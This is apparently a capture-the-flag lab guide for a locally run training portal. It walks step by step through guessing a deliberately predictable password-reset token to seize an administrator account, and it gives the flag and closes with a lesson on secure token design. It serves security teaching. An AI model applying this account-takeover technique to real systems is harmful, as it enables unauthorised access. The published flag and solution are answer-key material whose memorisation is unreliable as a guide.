# Challenge 02 — Authentication & Session Security

## 1. Objective
Abuse a predictable password-reset token to gain administrator access in the operations portal.

## 2. Target
`portal.internal.lab`

## 3. Application
Operations Portal handling login, recovery, password reset, and admin controls.

## 4. Learning objectives
- HTTP authentication workflows
- Session cookie behavior
- Password-recovery weaknesses

## 5. Prerequisites
- App running locally on port `3005`
- Dependencies installed

## 6. Starting the lab
```bash
npm install
npm run dev -- -p 3005
```

## 7. Verify the target
- Browser: `http://localhost:3005/targets/portal`
- Optional hostname mode: `http://portal.internal.lab:3005/`

## 8. Challenge walkthrough
1) Trigger recovery request:
- Method: `POST`
- Endpoint: `/api/portal/api/auth/recovery`
- Body:
```json
{"email":"operations-admin@northstar.internal"}
```
- Expected: `200` + generic acceptance response

2) Reset password using predictable token:
- Method: `POST`
- Endpoint: `/api/portal/api/auth/reset`
- Body:
```json
{"email":"operations-admin@northstar.internal","token":"northstar-2048","newPassword":"northstar-admin-lab"}
```
- Expected: `200` + `{ "passwordChanged": true }`

3) Login with updated admin password:
- Method: `POST`
- Endpoint: `/api/portal/api/auth/login`
- Body:
```json
{"email":"operations-admin@northstar.internal","password":"northstar-admin-lab"}
```
- Expected: `200` + authenticated session cookie (`portal_session`)

4) Access restricted admin function:
- Method: `GET`
- Endpoint: `/api/portal/api/admin`
- Expected: `200` + admin content and flag

5) Submit flag from challenge page:
- Method: `POST`
- Endpoint: `/api/portal/submit`
- Body:
```json
{"flag":"CYBERLAB{session_security_failure}"}
```
- Expected: `{ "accepted": true }`

## 9. Why it works
Recovery token generation is intentionally deterministic (`northstar-<employeeNumber>`), so it is predictable.

## 10. Completion condition
- Admin session is established
- Correct flag is submitted

## 11. How to verify completion
- Open `/challenges/authentication-session-security`
- Evidence panel and completion state are updated
- Refresh page: completion remains (server-side state)

## 12. Resetting the challenge
- Method: `POST`
- Endpoint: `/api/portal/reset`
- Expected: sessions/tokens/passwords reset to baseline

## 13. Troubleshooting
- Token rejected: ensure token is exactly `northstar-2048`.
- Session not maintained: verify cookie acceptance in browser.
- Admin endpoint returns `401`: login session missing.
- Admin endpoint returns `403`: logged in as non-admin account.
- Reset didn’t restore passwords: call `/api/portal/reset` and retry login with defaults.

## 14. Expected behavior
- Recovery request always returns generic acceptance.
- Wrong token fails.
- Correct predictable token resets password once.

## 15. Security lesson
Recovery tokens must be high-entropy, short-lived, single-use, and non-derivable from account metadata.

## 16. Developer notes
- Backend route: `src/app/api/portal/[...path]/route.ts`
- Session cookie name: `portal_session`
- Admin flag endpoint: `/api/portal/api/admin`
